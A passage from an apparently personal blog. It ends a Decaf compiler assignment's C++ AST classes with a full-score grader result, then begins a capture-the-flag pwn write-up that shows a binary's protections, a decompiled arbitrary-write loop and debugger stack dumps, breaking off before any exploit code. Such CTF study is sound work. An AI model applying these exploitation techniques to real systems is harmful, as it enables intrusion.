class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;FieldDecl(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+Kind+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVarList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafVar*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafVar*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafVarList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafVar*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(string Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kinds</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_kind</span>(Kind); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafVar *&gt;(List);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// decafStmtList - List of Decaf statements</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssign</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Var;</span><br><span class="line">	<span class="keyword">bool</span> key;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Exp2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_key</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;<span class="keyword">this</span>-&gt;key = key;&#125;</span><br><span class="line">	<span class="built_in">decafAssign</span>(string Var,decafAllexp* Exp,decafAllexp* Exp2):<span class="built_in">Var</span>(Var),<span class="built_in">Exp</span>(Exp),<span class="built_in">Exp2</span>(Exp2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Arr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignVar&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignArrayLoc&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr)+<span class="string">&quot;,&quot;</span>+ <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssignList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAssign *&gt;List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_keys</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> ass:List)&#123;</span><br><span class="line">			ass-&gt;<span class="built_in">put_key</span>(key);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> commaList&lt;class decafAssign *&gt;(List);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFunCall</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	list&lt;decafAST *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(list&lt;decafAST *&gt;  Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;MethodCall&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + commaList&lt;class decafAST *&gt;(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafOutput</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafOutput</span>(string Data)&#123;<span class="keyword">this</span>-&gt;Data = Data;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Data; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafPara</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafType *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafType *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafType *&gt;(Para); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafStmtList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafVarList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara * Para;</span><br><span class="line">	decafStmtList * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara * Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123; <span class="keyword">this</span>-&gt;Type = Type; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_block</span><span class="params">(decafStmtList *Block)</span></span>&#123; <span class="keyword">this</span>-&gt;Block = Block; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Method&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara* Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara* Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123; <span class="keyword">this</span>-&gt;Type = Type; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ExternFunction&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBlock</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafStmtList *FieldDeclList;</span><br><span class="line">	decafStmtList *StateDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBlock</span>(string kind,decafStmtList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Kind</span>(kind), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">StateDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafBlock</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (StateDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> StateDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(StateDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafIF</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafBlock * Block2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafIF</span>(decafAllexp * Exp,decafBlock * Block,decafBlock * Block2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">Block2</span>(Block2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;IfStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block2) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafWhile</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafWhile</span>(decafAllexp * Exp,decafBlock * Block): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;WhileStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFor</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafAssignList *List;</span><br><span class="line">	decafAssignList *List2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFor</span>(decafAllexp * Exp,decafBlock * Block,decafAssignList *List,decafAssignList *List2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">List</span>(List),<span class="built_in">List2</span>(List2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ForStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(List)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(List2)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafReturn</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafReturn</span>(decafAllexp * Exp)&#123; <span class="keyword">this</span>-&gt;Exp = Exp; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ReturnStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// ProgramAST - the decaf program</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafStmtList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafStmtList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终拿到了满分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  decafast git:(master) ✗ python3 check.<span class="function">py </span></span><br><span class="line"><span class="function"><span class="title">Correct</span><span class="params">(dev)</span>: 134 / 134</span></span><br><span class="line"><span class="function"><span class="title">Score</span><span class="params">(dev)</span>: 134.00</span></span><br><span class="line"><span class="function">Total Score: 134.00</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/25/p4CTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/25/p4CTF2023/" class="post-title-link" itemprop="url">p4CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-25 03:39:31 / Modified: 03:41:34" itemprop="dateCreated datePublished" datetime="2023-06-25T03:39:31+08:00">2023-06-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="easy-pwneasy"><a href="#easy-pwneasy" class="headerlink" title="easy_pwneasy"></a>easy_pwneasy</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwneasy: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=c3f0880bf68ea5bca97853dd259cf44c5f1f9e5a, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX，PIE</li>
</ul>
<p><strong>漏洞思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;give me address: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf_addr, <span class="number">0x20</span>uLL);</span><br><span class="line">  addr = (_QWORD *)atoll(buf_addr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;give me value: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf_value, <span class="number">0x20</span>uLL);</span><br><span class="line">  value = atoll(buf_value);</span><br><span class="line">  <span class="built_in">set</span>(addr, value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;OK %s = %s\n&quot;</span>, buf_addr, buf_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序非常简洁，就只有3次任意地址写的机会</li>
</ul>
<p>程序提供的功能太少，我的第一反应是看看栈上有没有遗留的地址可以利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc64422df0</span><span class="number">-0x60</span> <span class="comment">/* buf_value */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp rcx<span class="number">-1</span> <span class="number">0x7ffc64422d90</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│           <span class="number">0x7ffc64422d98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│           <span class="number">0x7ffc64422da0</span> —▸ <span class="number">0x7fe493363600</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│           <span class="number">0x7ffc64422da8</span> —▸ <span class="number">0x7fe4931d762d</span> (_IO_file_setbuf+<span class="number">13</span>) ◂— test   rax, rax</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│           <span class="number">0x7ffc64422db0</span> —▸ <span class="number">0x7fe493367631</span> ◂— <span class="number">0xd700007fe4933271</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│           <span class="number">0x7ffc64422db8</span> —▸ <span class="number">0x7fe4931ce765</span> (setvbuf+<span class="number">245</span>) ◂— cmp    rax, <span class="number">1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│           <span class="number">0x7ffc64422dc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│           <span class="number">0x7ffc64422dc8</span> —▸ <span class="number">0x7ffc64422df0</span> —▸ <span class="number">0x7ffc64422e00</span> ◂— <span class="number">0x1</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc64422df0</span><span class="number">-0x40</span> <span class="comment">/* buf_addr */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffc64422db0</span> —▸ <span class="number">0x7fe493367631</span> ◂— <span class="number">0xd700007fe4933271</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffc64422db8</span> —▸ <span class="number">0x7fe4931ce765</span> (setvbuf+<span class="number">245</span>) ◂— cmp    rax, 